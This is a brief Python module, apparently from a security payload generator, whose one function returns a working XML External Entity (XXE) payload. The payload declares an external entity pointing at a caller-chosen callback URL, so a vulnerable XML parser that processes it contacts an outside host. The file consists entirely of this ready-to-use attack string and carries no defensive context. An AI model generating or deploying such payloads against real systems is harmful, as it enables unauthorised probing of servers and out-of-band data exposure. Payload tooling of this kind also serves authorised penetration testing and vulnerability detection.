"""External entity XXE payload."""

from __future__ import annotations
__all__ = ["generate"]


def generate(callback_url: str) -> str:
    """
    Minimal external entity XXE payload.
    
    Params:
    - callback_url: URL to beacon to when executed.
    
    Returns:
    - Rendered payload string.
    
    """
    return f'<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "{callback_url}">]><foo>&xxe;</foo>'
